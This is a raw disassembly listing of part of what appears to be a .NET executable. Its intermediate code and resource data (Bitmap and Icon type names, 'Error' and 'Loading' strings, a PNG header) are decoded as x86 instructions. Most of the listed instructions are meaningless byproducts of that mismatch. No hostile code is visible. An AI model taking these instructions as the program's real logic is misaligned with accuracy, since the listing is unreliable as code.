  40412f:	04 12                	add    $0x12,%al
  404131:	00 28                	add    %ch,(%eax)
  404133:	44                   	inc    %esp
  404134:	00 00                	add    %al,(%eax)
  404136:	06                   	push   %es
  404137:	80 44 00 00 04       	addb   $0x4,0x0(%eax,%eax,1)
  40413c:	7e 45                	jle    0x404183
  40413e:	00 00                	add    %al,(%eax)
  404140:	04 12                	add    $0x12,%al
  404142:	00 28                	add    %ch,(%eax)
  404144:	44                   	inc    %esp
  404145:	00 00                	add    %al,(%eax)
  404147:	06                   	push   %es
  404148:	80 45 00 00          	addb   $0x0,0x0(%ebp)
  40414c:	04 7e                	add    $0x7e,%al
  40414e:	46                   	inc    %esi
  40414f:	00 00                	add    %al,(%eax)
  404151:	04 12                	add    $0x12,%al
  404153:	00 28                	add    %ch,(%eax)
  404155:	44                   	inc    %esp
  404156:	00 00                	add    %al,(%eax)
  404158:	06                   	push   %es
  404159:	80 46 00 00          	addb   $0x0,0x0(%esi)
  40415d:	04 7e                	add    $0x7e,%al
  40415f:	47                   	inc    %edi
  404160:	00 00                	add    %al,(%eax)
  404162:	04 12                	add    $0x12,%al
  404164:	00 28                	add    %ch,(%eax)
  404166:	44                   	inc    %esp
  404167:	00 00                	add    %al,(%eax)
  404169:	06                   	push   %es
  40416a:	80 47 00 00          	addb   $0x0,0x0(%edi)
  40416e:	04 7e                	add    $0x7e,%al
  404170:	48                   	dec    %eax
  404171:	00 00                	add    %al,(%eax)
  404173:	04 12                	add    $0x12,%al
  404175:	00 28                	add    %ch,(%eax)
  404177:	44                   	inc    %esp
  404178:	00 00                	add    %al,(%eax)
  40417a:	06                   	push   %es
  40417b:	80 48 00 00          	orb    $0x0,0x0(%eax)
  40417f:	04 14                	add    $0x14,%al
  404181:	80 49 00 00          	orb    $0x0,0x0(%ecx)
  404185:	04 2a                	add    $0x2a,%al
  404187:	00 1b                	add    %bl,(%ebx)
  404189:	30 01                	xor    %al,(%ecx)
  40418b:	00 18                	add    %bl,(%eax)
  40418d:	00 00                	add    %al,(%eax)
  40418f:	00 13                	add    %dl,(%ebx)
  404191:	00 00                	add    %al,(%eax)
  404193:	11 28                	adc    %ebp,(%eax)
  404195:	f3 00 00             	repz add %al,(%eax)
  404198:	0a 6f f4             	or     -0xc(%edi),%ch
  40419b:	00 00                	add    %al,(%eax)
  40419d:	0a 0a                	or     (%edx),%cl
  40419f:	de 09                	fimuls (%ecx)
  4041a1:	26 72 33             	es jb  0x4041d7
  4041a4:	07                   	pop    %es
  4041a5:	00 70 0a             	add    %dh,0xa(%eax)
  4041a8:	de 00                	fiadds (%eax)
  4041aa:	06                   	push   %es
  4041ab:	2a 01                	sub    (%ecx),%al
  4041ad:	10 00                	adc    %al,(%eax)
  4041af:	00 00                	add    %al,(%eax)
  4041b1:	00 00                	add    %al,(%eax)
  4041b3:	00 0d 0d 00 09 0b    	add    %cl,0xb09000d
  4041b9:	00 00                	add    %al,(%eax)
  4041bb:	01 a2 03 7b 4a 00    	add    %esp,0x4a7b03(%edx)
  4041c1:	00 04 02             	add    %al,(%edx,%eax,1)
  4041c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4041c5:	f5                   	cmc
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	0a 2d 0d 03 7b 4b    	or     0x4b7b030d,%ch
  4041ce:	00 00                	add    %al,(%eax)
  4041d0:	04 02                	add    $0x2,%al
  4041d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d3:	f6 00 00             	testb  $0x0,(%eax)
  4041d6:	0a 2a                	or     (%edx),%ch
  4041d8:	03 7b 4a             	add    0x4a(%ebx),%edi
  4041db:	00 00                	add    %al,(%eax)
  4041dd:	04 02                	add    $0x2,%al
  4041df:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e0:	f6 00 00             	testb  $0x0,(%eax)
  4041e3:	0a 2a                	or     (%edx),%ch
  4041e5:	ae                   	scas   %es:(%edi),%al
  4041e6:	02 28                	add    (%eax),%ch
  4041e8:	0a 00                	or     (%eax),%al
  4041ea:	00 0a                	add    %cl,(%edx)
  4041ec:	02 03                	add    (%ebx),%al
  4041ee:	7d 4f                	jge    0x40423f
  4041f0:	00 00                	add    %al,(%eax)
  4041f2:	04 02                	add    $0x2,%al
  4041f4:	04 7d                	add    $0x7d,%al
  4041f6:	50                   	push   %eax
  4041f7:	00 00                	add    %al,(%eax)
  4041f9:	04 02                	add    $0x2,%al
  4041fb:	72 14                	jb     0x404211
  4041fd:	16                   	push   %ss
  4041fe:	00 70 02             	add    %dh,0x2(%eax)
  404201:	28 46 00             	sub    %al,0x0(%esi)
  404204:	00 06                	add    %al,(%esi)
  404206:	28 45 00             	sub    %al,0x0(%ebp)
  404209:	00 0a                	add    %cl,(%edx)
  40420b:	7d 51                	jge    0x40425e
  40420d:	00 00                	add    %al,(%eax)
  40420f:	04 2a                	add    $0x2a,%al
  404211:	00 00                	add    %al,(%eax)
  404213:	00 13                	add    %dl,(%ebx)
  404215:	30 02                	xor    %al,(%edx)
  404217:	00 23                	add    %ah,(%ebx)
  404219:	00 00                	add    %al,(%eax)
  40421b:	00 14 00             	add    %dl,(%eax,%eax,1)
  40421e:	00 11                	add    %dl,(%ecx)
  404220:	02 7b 50             	add    0x50(%ebx),%bh
  404223:	00 00                	add    %al,(%eax)
  404225:	04 0a                	add    $0xa,%al
  404227:	06                   	push   %es
  404228:	17                   	pop    %ss
  404229:	2e 06                	cs push %es
  40422b:	06                   	push   %es
  40422c:	18 2e                	sbb    %ch,(%esi)
  40422e:	08 2b                	or     %ch,(%ebx)
  404230:	0c 72                	or     $0x72,%al
  404232:	3a 16                	cmp    (%esi),%dl
  404234:	00 70 2a             	add    %dh,0x2a(%eax)
  404237:	72 40                	jb     0x404279
  404239:	16                   	push   %ss
  40423a:	00 70 2a             	add    %dh,0x2a(%eax)
  40423d:	72 4a                	jb     0x404289
  40423f:	16                   	push   %ss
  404240:	00 70 2a             	add    %dh,0x2a(%eax)
  404243:	00 1b                	add    %bl,(%ebx)
  404245:	30 06                	xor    %al,(%esi)
  404247:	00 7e 00             	add    %bh,0x0(%esi)
  40424a:	00 00                	add    %al,(%eax)
  40424c:	15 00 00 11 28       	adc    $0x28110000,%eax
  404251:	f7 00 00 0a 6f f8    	testl  $0xf86f0a00,(%eax)
  404257:	00 00                	add    %al,(%eax)
  404259:	0a 19                	or     (%ecx),%bl
  40425b:	17                   	pop    %ss
  40425c:	19 1f                	sbb    %ebx,(%edi)
  40425e:	10 17                	adc    %dl,(%edi)
  404260:	73 f9                	jae    0x40425b
  404262:	00 00                	add    %al,(%eax)
  404264:	0a 0a                	or     (%edx),%cl
  404266:	1f                   	pop    %ds
  404267:	20 8d 2f 00 00 01    	and    %cl,0x100002f(%ebp)
  40426d:	0b 06                	or     (%esi),%eax
  40426f:	07                   	pop    %es
  404270:	8e 69 65             	mov    0x65(%ecx),%gs
  404273:	6a 18                	push   $0x18
  404275:	6f                   	outsl  %ds:(%esi),(%dx)
  404276:	fa                   	cli
  404277:	00 00                	add    %al,(%eax)
  404279:	0a 26                	or     (%esi),%ah
  40427b:	06                   	push   %es
  40427c:	07                   	pop    %es
  40427d:	16                   	push   %ss
  40427e:	07                   	pop    %es
  40427f:	8e 69 6f             	mov    0x6f(%ecx),%gs
  404282:	fb                   	sti
  404283:	00 00                	add    %al,(%eax)
  404285:	0a 26                	or     (%esi),%ah
  404287:	28 fc                	sub    %bh,%ah
  404289:	00 00                	add    %al,(%eax)
  40428b:	0a 07                	or     (%edi),%al
  40428d:	16                   	push   %ss
  40428e:	1f                   	pop    %ds
  40428f:	10 6f fd             	adc    %ch,-0x3(%edi)
  404292:	00 00                	add    %al,(%eax)
  404294:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  404297:	14 fe                	adc    $0xfe,%al
  404299:	06                   	push   %es
  40429a:	fe 00                	incb   (%eax)
  40429c:	00 0a                	add    %cl,(%edx)
  40429e:	73 ff                	jae    0x40429f
  4042a0:	00 00                	add    %al,(%eax)
  4042a2:	0a 28                	or     (%eax),%ch
  4042a4:	0c 00                	or     $0x0,%al
  4042a6:	00 2b                	add    %ch,(%ebx)
  4042a8:	2d 03 14 2b 01       	sub    $0x12b1403,%eax
  4042ad:	08 0c 08             	or     %cl,(%eax,%ecx,1)
  4042b0:	08 2c 06             	or     %ch,(%esi,%eax,1)
  4042b3:	07                   	pop    %es
  4042b4:	1f                   	pop    %ds
  4042b5:	10 91 2b 01 16 73    	adc    %dl,0x7316012b(%ecx)
  4042bb:	45                   	inc    %ebp
  4042bc:	00 00                	add    %al,(%eax)
  4042be:	06                   	push   %es
  4042bf:	0d de 0a 06 2c       	or     $0x2c060ade,%eax
  4042c4:	06                   	push   %es
  4042c5:	06                   	push   %es
  4042c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4042c7:	3a 00                	cmp    (%eax),%al
  4042c9:	00 0a                	add    %cl,(%edx)
  4042cb:	dc 09                	fmull  (%ecx)
  4042cd:	2a 00                	sub    (%eax),%al
  4042cf:	00 01                	add    %al,(%ecx)
  4042d1:	10 00                	adc    %al,(%eax)
  4042d3:	00 02                	add    %al,(%edx)
  4042d5:	00 16                	add    %dl,(%esi)
  4042d7:	00 5c 72 00          	add    %bl,0x0(%edx,%esi,2)
  4042db:	0a 00                	or     (%eax),%al
  4042dd:	00 00                	add    %al,(%eax)
  4042df:	00 ae 7e 59 00 00    	add    %ch,0x597e(%esi)
  4042e5:	04 2d                	add    $0x2d,%al
  4042e7:	1e                   	push   %ds
  4042e8:	72 52                	jb     0x40433c
  4042ea:	16                   	push   %ss
  4042eb:	00 70 d0             	add    %dh,-0x30(%eax)
  4042ee:	1b 00                	sbb    (%eax),%eax
  4042f0:	00 02                	add    %al,(%edx)
  4042f2:	28 80 00 00 0a 6f    	sub    %al,0x6f0a0000(%eax)
  4042f8:	01 01                	add    %eax,(%ecx)
  4042fa:	00 0a                	add    %cl,(%edx)
  4042fc:	73 02                	jae    0x404300
  4042fe:	01 00                	add    %eax,(%eax)
  404300:	0a 80 59 00 00 04    	or     0x4000059(%eax),%al
  404306:	7e 59                	jle    0x404361
  404308:	00 00                	add    %al,(%eax)
  40430a:	04 2a                	add    $0x2a,%al
  40430c:	1a 7e 5a             	sbb    0x5a(%esi),%bh
  40430f:	00 00                	add    %al,(%eax)
  404311:	04 2a                	add    $0x2a,%al
  404313:	1e                   	push   %ds
  404314:	02 80 5a 00 00 04    	add    0x400005a(%eax),%al
  40431a:	2a 6a 28             	sub    0x28(%edx),%ch
  40431d:	4b                   	dec    %ebx
  40431e:	00 00                	add    %al,(%eax)
  404320:	06                   	push   %es
  404321:	72 9a                	jb     0x4042bd
  404323:	16                   	push   %ss
  404324:	00 70 7e             	add    %dh,0x7e(%eax)
  404327:	5a                   	pop    %edx
  404328:	00 00                	add    %al,(%eax)
  40432a:	04 6f                	add    $0x6f,%al
  40432c:	03 01                	add    (%ecx),%eax
  40432e:	00 0a                	add    %cl,(%edx)
  404330:	74 89                	je     0x4042bb
  404332:	00 00                	add    %al,(%eax)
  404334:	01 2a                	add    %ebp,(%edx)
  404336:	6a 28                	push   $0x28
  404338:	4b                   	dec    %ebx
  404339:	00 00                	add    %al,(%eax)
  40433b:	06                   	push   %es
  40433c:	72 a6                	jb     0x4042e4
  40433e:	16                   	push   %ss
  40433f:	00 70 7e             	add    %dh,0x7e(%eax)
  404342:	5a                   	pop    %edx
  404343:	00 00                	add    %al,(%eax)
  404345:	04 6f                	add    $0x6f,%al
  404347:	03 01                	add    (%ecx),%eax
  404349:	00 0a                	add    %cl,(%edx)
  40434b:	74 3c                	je     0x404389
  40434d:	00 00                	add    %al,(%eax)
  40434f:	01 2a                	add    %ebp,(%edx)
  404351:	6a 28                	push   $0x28
  404353:	4b                   	dec    %ebx
  404354:	00 00                	add    %al,(%eax)
  404356:	06                   	push   %es
  404357:	72 b0                	jb     0x404309
  404359:	16                   	push   %ss
  40435a:	00 70 7e             	add    %dh,0x7e(%eax)
  40435d:	5a                   	pop    %edx
  40435e:	00 00                	add    %al,(%eax)
  404360:	04 6f                	add    $0x6f,%al
  404362:	03 01                	add    (%ecx),%eax
  404364:	00 0a                	add    %cl,(%edx)
  404366:	74 89                	je     0x4042f1
  404368:	00 00                	add    %al,(%eax)
  40436a:	01 2a                	add    %ebp,(%edx)
  40436c:	b4 00                	mov    $0x0,%ah
  40436e:	00 00                	add    %al,(%eax)
  404370:	ce                   	into
  404371:	ca ef be             	lret   $0xbeef
  404374:	01 00                	add    %eax,(%eax)
  404376:	00 00                	add    %al,(%eax)
  404378:	91                   	xchg   %eax,%ecx
  404379:	00 00                	add    %al,(%eax)
  40437b:	00 6c 53 79          	add    %ch,0x79(%ebx,%edx,2)
  40437f:	73 74                	jae    0x4043f5
  404381:	65 6d                	gs insl (%dx),%es:(%edi)
  404383:	2e 52                	cs push %edx
  404385:	65 73 6f             	gs jae 0x4043f7
  404388:	75 72                	jne    0x4043fc
  40438a:	63 65 73             	arpl   %esp,0x73(%ebp)
  40438d:	2e 52                	cs push %edx
  40438f:	65 73 6f             	gs jae 0x404401
  404392:	75 72                	jne    0x404406
  404394:	63 65 52             	arpl   %esp,0x52(%ebp)
  404397:	65 61                	gs popa
  404399:	64 65 72 2c          	fs gs jb 0x4043c9
  40439d:	20 6d 73             	and    %ch,0x73(%ebp)
  4043a0:	63 6f 72             	arpl   %ebp,0x72(%edi)
  4043a3:	6c                   	insb   (%dx),%es:(%edi)
  4043a4:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%edx),%esp
  4043ab:	73 69                	jae    0x404416
  4043ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4043ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4043af:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  4043b4:	30 2e                	xor    %ch,(%esi)
  4043b6:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
  4043b9:	43                   	inc    %ebx
  4043ba:	75 6c                	jne    0x404428
  4043bc:	74 75                	je     0x404433
  4043be:	72 65                	jb     0x404425
  4043c0:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  4043c5:	72 61                	jb     0x404428
  4043c7:	6c                   	insb   (%dx),%es:(%edi)
  4043c8:	2c 20                	sub    $0x20,%al
  4043ca:	50                   	push   %eax
  4043cb:	75 62                	jne    0x40442f
  4043cd:	6c                   	insb   (%dx),%es:(%edi)
  4043ce:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  4043d5:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
  4043d9:	62 37                	bound  %esi,(%edi)
  4043db:	37                   	aaa
  4043dc:	61                   	popa
  4043dd:	35 63 35 36 31       	xor    $0x31363563,%eax
  4043e2:	39 33                	cmp    %esi,(%ebx)
  4043e4:	34 65                	xor    $0x65,%al
  4043e6:	30 38                	xor    %bh,(%eax)
  4043e8:	39 23                	cmp    %esp,(%ebx)
  4043ea:	53                   	push   %ebx
  4043eb:	79 73                	jns    0x404460
  4043ed:	74 65                	je     0x404454
  4043ef:	6d                   	insl   (%dx),%es:(%edi)
  4043f0:	2e 52                	cs push %edx
  4043f2:	65 73 6f             	gs jae 0x404464
  4043f5:	75 72                	jne    0x404469
  4043f7:	63 65 73             	arpl   %esp,0x73(%ebp)
  4043fa:	2e 52                	cs push %edx
  4043fc:	75 6e                	jne    0x40446c
  4043fe:	74 69                	je     0x404469
  404400:	6d                   	insl   (%dx),%es:(%edi)
  404401:	65 52                	gs push %edx
  404403:	65 73 6f             	gs jae 0x404475
  404406:	75 72                	jne    0x40447a
  404408:	63 65 53             	arpl   %esp,0x53(%ebp)
  40440b:	65 74 02             	gs je  0x404410
	...
  404416:	00 00                	add    %al,(%eax)
  404418:	00 50 41             	add    %dl,0x41(%eax)
  40441b:	44                   	inc    %esp
  40441c:	50                   	push   %eax
  40441d:	41                   	inc    %ecx
  40441e:	44                   	inc    %esp
  40441f:	50                   	push   %eax
  404420:	b4 00                	mov    $0x0,%ah
  404422:	00 00                	add    %al,(%eax)
  404424:	28 64 01 00          	sub    %ah,0x0(%ecx,%eax,1)
  404428:	ce                   	into
  404429:	ca ef be             	lret   $0xbeef
  40442c:	01 00                	add    %eax,(%eax)
  40442e:	00 00                	add    %al,(%eax)
  404430:	91                   	xchg   %eax,%ecx
  404431:	00 00                	add    %al,(%eax)
  404433:	00 6c 53 79          	add    %ch,0x79(%ebx,%edx,2)
  404437:	73 74                	jae    0x4044ad
  404439:	65 6d                	gs insl (%dx),%es:(%edi)
  40443b:	2e 52                	cs push %edx
  40443d:	65 73 6f             	gs jae 0x4044af
  404440:	75 72                	jne    0x4044b4
  404442:	63 65 73             	arpl   %esp,0x73(%ebp)
  404445:	2e 52                	cs push %edx
  404447:	65 73 6f             	gs jae 0x4044b9
  40444a:	75 72                	jne    0x4044be
  40444c:	63 65 52             	arpl   %esp,0x52(%ebp)
  40444f:	65 61                	gs popa
  404451:	64 65 72 2c          	fs gs jb 0x404481
  404455:	20 6d 73             	and    %ch,0x73(%ebp)
  404458:	63 6f 72             	arpl   %ebp,0x72(%edi)
  40445b:	6c                   	insb   (%dx),%es:(%edi)
  40445c:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%edx),%esp
  404463:	73 69                	jae    0x4044ce
  404465:	6f                   	outsl  %ds:(%esi),(%dx)
  404466:	6e                   	outsb  %ds:(%esi),(%dx)
  404467:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  40446c:	30 2e                	xor    %ch,(%esi)
  40446e:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
  404471:	43                   	inc    %ebx
  404472:	75 6c                	jne    0x4044e0
  404474:	74 75                	je     0x4044eb
  404476:	72 65                	jb     0x4044dd
  404478:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  40447d:	72 61                	jb     0x4044e0
  40447f:	6c                   	insb   (%dx),%es:(%edi)
  404480:	2c 20                	sub    $0x20,%al
  404482:	50                   	push   %eax
  404483:	75 62                	jne    0x4044e7
  404485:	6c                   	insb   (%dx),%es:(%edi)
  404486:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  40448d:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
  404491:	62 37                	bound  %esi,(%edi)
  404493:	37                   	aaa
  404494:	61                   	popa
  404495:	35 63 35 36 31       	xor    $0x31363563,%eax
  40449a:	39 33                	cmp    %esi,(%ebx)
  40449c:	34 65                	xor    $0x65,%al
  40449e:	30 38                	xor    %bh,(%eax)
  4044a0:	39 23                	cmp    %esp,(%ebx)
  4044a2:	53                   	push   %ebx
  4044a3:	79 73                	jns    0x404518
  4044a5:	74 65                	je     0x40450c
  4044a7:	6d                   	insl   (%dx),%es:(%edi)
  4044a8:	2e 52                	cs push %edx
  4044aa:	65 73 6f             	gs jae 0x40451c
  4044ad:	75 72                	jne    0x404521
  4044af:	63 65 73             	arpl   %esp,0x73(%ebp)
  4044b2:	2e 52                	cs push %edx
  4044b4:	75 6e                	jne    0x404524
  4044b6:	74 69                	je     0x404521
  4044b8:	6d                   	insl   (%dx),%es:(%edi)
  4044b9:	65 52                	gs push %edx
  4044bb:	65 73 6f             	gs jae 0x40452d
  4044be:	75 72                	jne    0x404532
  4044c0:	63 65 53             	arpl   %esp,0x53(%ebp)
  4044c3:	65 74 02             	gs je  0x4044c8
  4044c6:	00 00                	add    %al,(%eax)
  4044c8:	00 03                	add    %al,(%ebx)
  4044ca:	00 00                	add    %al,(%eax)
  4044cc:	00 02                	add    %al,(%edx)
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	00 68 53             	add    %ch,0x53(%eax)
  4044d3:	79 73                	jns    0x404548
  4044d5:	74 65                	je     0x40453c
  4044d7:	6d                   	insl   (%dx),%es:(%edi)
  4044d8:	2e 44                	cs inc %esp
  4044da:	72 61                	jb     0x40453d
  4044dc:	77 69                	ja     0x404547
  4044de:	6e                   	outsb  %ds:(%esi),(%dx)
  4044df:	67 2e 42             	addr16 cs inc %edx
  4044e2:	69 74 6d 61 70 2c 20 	imul   $0x53202c70,0x61(%ebp,%ebp,2),%esi
  4044e9:	53 
  4044ea:	79 73                	jns    0x40455f
  4044ec:	74 65                	je     0x404553
  4044ee:	6d                   	insl   (%dx),%es:(%edi)
  4044ef:	2e 44                	cs inc %esp
  4044f1:	72 61                	jb     0x404554
  4044f3:	77 69                	ja     0x40455e
  4044f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4044f6:	67 2c 20             	addr16 sub $0x20,%al
  4044f9:	56                   	push   %esi
  4044fa:	65 72 73             	gs jb  0x404570
  4044fd:	69 6f 6e 3d 34 2e 30 	imul   $0x302e343d,0x6e(%edi),%ebp
  404504:	2e 30 2e             	xor    %ch,%cs:(%esi)
  404507:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
  40450a:	43                   	inc    %ebx
  40450b:	75 6c                	jne    0x404579
  40450d:	74 75                	je     0x404584
  40450f:	72 65                	jb     0x404576
  404511:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  404516:	72 61                	jb     0x404579
  404518:	6c                   	insb   (%dx),%es:(%edi)
  404519:	2c 20                	sub    $0x20,%al
  40451b:	50                   	push   %eax
  40451c:	75 62                	jne    0x404580
  40451e:	6c                   	insb   (%dx),%es:(%edi)
  40451f:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  404526:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
  40452a:	62 30                	bound  %esi,(%eax)
  40452c:	33 66 35             	xor    0x35(%esi),%esp
  40452f:	66 37                	data16 aaa
  404531:	66 31 31             	xor    %si,(%ecx)
  404534:	64 35 30 61 33 61    	fs xor $0x61336130,%eax
  40453a:	66 53                	push   %bx
  40453c:	79 73                	jns    0x4045b1
  40453e:	74 65                	je     0x4045a5
  404540:	6d                   	insl   (%dx),%es:(%edi)
  404541:	2e 44                	cs inc %esp
  404543:	72 61                	jb     0x4045a6
  404545:	77 69                	ja     0x4045b0
  404547:	6e                   	outsb  %ds:(%esi),(%dx)
  404548:	67 2e 49             	addr16 cs dec %ecx
  40454b:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  40454e:	2c 20                	sub    $0x20,%al
  404550:	53                   	push   %ebx
  404551:	79 73                	jns    0x4045c6
  404553:	74 65                	je     0x4045ba
  404555:	6d                   	insl   (%dx),%es:(%edi)
  404556:	2e 44                	cs inc %esp
  404558:	72 61                	jb     0x4045bb
  40455a:	77 69                	ja     0x4045c5
  40455c:	6e                   	outsb  %ds:(%esi),(%dx)
  40455d:	67 2c 20             	addr16 sub $0x20,%al
  404560:	56                   	push   %esi
  404561:	65 72 73             	gs jb  0x4045d7
  404564:	69 6f 6e 3d 34 2e 30 	imul   $0x302e343d,0x6e(%edi),%ebp
  40456b:	2e 30 2e             	xor    %ch,%cs:(%esi)
  40456e:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
  404571:	43                   	inc    %ebx
  404572:	75 6c                	jne    0x4045e0
  404574:	74 75                	je     0x4045eb
  404576:	72 65                	jb     0x4045dd
  404578:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  40457d:	72 61                	jb     0x4045e0
  40457f:	6c                   	insb   (%dx),%es:(%edi)
  404580:	2c 20                	sub    $0x20,%al
  404582:	50                   	push   %eax
  404583:	75 62                	jne    0x4045e7
  404585:	6c                   	insb   (%dx),%es:(%edi)
  404586:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  40458d:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
  404591:	62 30                	bound  %esi,(%eax)
  404593:	33 66 35             	xor    0x35(%esi),%esp
  404596:	66 37                	data16 aaa
  404598:	66 31 31             	xor    %si,(%ecx)
  40459b:	64 35 30 61 33 61    	fs xor $0x61336130,%eax
  4045a1:	50                   	push   %eax
  4045a2:	41                   	inc    %ecx
  4045a3:	44                   	inc    %esp
  4045a4:	50                   	push   %eax
  4045a5:	41                   	inc    %ecx
  4045a6:	44                   	inc    %esp
  4045a7:	50                   	push   %eax
  4045a8:	dd 11                	fstl   (%ecx)
  4045aa:	ff 0b                	decl   (%ebx)
  4045ac:	83 b7 8c 51 ee 64 82 	xorl   $0xffffff82,0x64ee518c(%edi)
  4045b3:	7c 00                	jl     0x4045b5
  4045b5:	00 00                	add    %al,(%eax)
  4045b7:	00 1c 00             	add    %bl,(%eax,%eax,1)
  4045ba:	00 00                	add    %al,(%eax)
  4045bc:	0f 00 00             	sldt   (%eax)
  4045bf:	00 cb                	add    %cl,%bl
  4045c1:	01 00                	add    %eax,(%eax)
  4045c3:	00 0a                	add    %cl,(%edx)
  4045c5:	45                   	inc    %ebp
  4045c6:	00 72 00             	add    %dh,0x0(%edx)
  4045c9:	72 00                	jb     0x4045cb
  4045cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4045cc:	00 72 00             	add    %dh,0x0(%edx)
  4045cf:	00 00                	add    %al,(%eax)
  4045d1:	00 00                	add    %al,(%eax)
  4045d3:	08 49 00             	or     %cl,0x0(%ecx)
  4045d6:	63 00                	arpl   %eax,(%eax)
  4045d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045d9:	00 6e 00             	add    %ch,0x0(%esi)
  4045dc:	bb 0a 00 00 0e       	mov    $0xe00000a,%ebx
  4045e1:	4c                   	dec    %esp
  4045e2:	00 6f 00             	add    %ch,0x0(%edi)
  4045e5:	61                   	popa
  4045e6:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  4045ea:	00 6e 00             	add    %ch,0x0(%esi)
  4045ed:	67 00 23             	add    %ah,(%bp,%di)
  4045f0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4045f1:	00 00                	add    %al,(%eax)
  4045f3:	40                   	inc    %eax
  4045f4:	00 01                	add    %al,(%ecx)
  4045f6:	00 00                	add    %al,(%eax)
  4045f8:	00 ff                	add    %bh,%bh
  4045fa:	ff                   	(bad)
  4045fb:	ff                   	(bad)
  4045fc:	ff 01                	incl   (%ecx)
  4045fe:	00 00                	add    %al,(%eax)
  404600:	00 00                	add    %al,(%eax)
  404602:	00 00                	add    %al,(%eax)
  404604:	00 0c 02             	add    %cl,(%edx,%eax,1)
  404607:	00 00                	add    %al,(%eax)
  404609:	00 51 53             	add    %dl,0x53(%ecx)
  40460c:	79 73                	jns    0x404681
  40460e:	74 65                	je     0x404675
  404610:	6d                   	insl   (%dx),%es:(%edi)
  404611:	2e 44                	cs inc %esp
  404613:	72 61                	jb     0x404676
  404615:	77 69                	ja     0x404680
  404617:	6e                   	outsb  %ds:(%esi),(%dx)
  404618:	67 2c 20             	addr16 sub $0x20,%al
  40461b:	56                   	push   %esi
  40461c:	65 72 73             	gs jb  0x404692
  40461f:	69 6f 6e 3d 34 2e 30 	imul   $0x302e343d,0x6e(%edi),%ebp
  404626:	2e 30 2e             	xor    %ch,%cs:(%esi)
  404629:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
  40462c:	43                   	inc    %ebx
  40462d:	75 6c                	jne    0x40469b
  40462f:	74 75                	je     0x4046a6
  404631:	72 65                	jb     0x404698
  404633:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  404638:	72 61                	jb     0x40469b
  40463a:	6c                   	insb   (%dx),%es:(%edi)
  40463b:	2c 20                	sub    $0x20,%al
  40463d:	50                   	push   %eax
  40463e:	75 62                	jne    0x4046a2
  404640:	6c                   	insb   (%dx),%es:(%edi)
  404641:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  404648:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
  40464c:	62 30                	bound  %esi,(%eax)
  40464e:	33 66 35             	xor    0x35(%esi),%esp
  404651:	66 37                	data16 aaa
  404653:	66 31 31             	xor    %si,(%ecx)
  404656:	64 35 30 61 33 61    	fs xor $0x61336130,%eax
  40465c:	05 01 00 00 00       	add    $0x1,%eax
  404661:	15 53 79 73 74       	adc    $0x74737953,%eax
  404666:	65 6d                	gs insl (%dx),%es:(%edi)
  404668:	2e 44                	cs inc %esp
  40466a:	72 61                	jb     0x4046cd
  40466c:	77 69                	ja     0x4046d7
  40466e:	6e                   	outsb  %ds:(%esi),(%dx)
  40466f:	67 2e 42             	addr16 cs inc %edx
  404672:	69 74 6d 61 70 01 00 	imul   $0x170,0x61(%ebp,%ebp,2),%esi
  404679:	00 
  40467a:	00 04 44             	add    %al,(%esp,%eax,2)
  40467d:	61                   	popa
  40467e:	74 61                	je     0x4046e1
  404680:	07                   	pop    %es
  404681:	02 02                	add    (%edx),%al
  404683:	00 00                	add    %al,(%eax)
  404685:	00 09                	add    %cl,(%ecx)
  404687:	03 00                	add    (%eax),%eax
  404689:	00 00                	add    %al,(%eax)
  40468b:	0f 03 00             	lsl    (%eax),%eax
  40468e:	00 00                	add    %al,(%eax)
  404690:	18 0a                	sbb    %cl,(%edx)
  404692:	00 00                	add    %al,(%eax)
  404694:	02 89 50 4e 47 0d    	add    0xd474e50(%ecx),%cl
  40469a:	0a 1a                	or     (%edx),%bl
  40469c:	0a 00                	or     (%eax),%al
  40469e:	00 00                	add    %al,(%eax)
  4046a0:	0d 49 48 44 52       	or     $0x52444849,%eax
  4046a5:	00 00                	add    %al,(%eax)
  4046a7:	00 96 00 00 00 86    	add    %dl,-0x7a000000(%esi)
  4046ad:	08 06                	or     %al,(%esi)
  4046af:	00 00                	add    %al,(%eax)
  4046b1:	00 3f                	add    %bh,(%edi)
  4046b3:	d7                   	xlat   %ds:(%ebx)
  4046b4:	73 79                	jae    0x40472f
  4046b6:	00 00                	add    %al,(%eax)
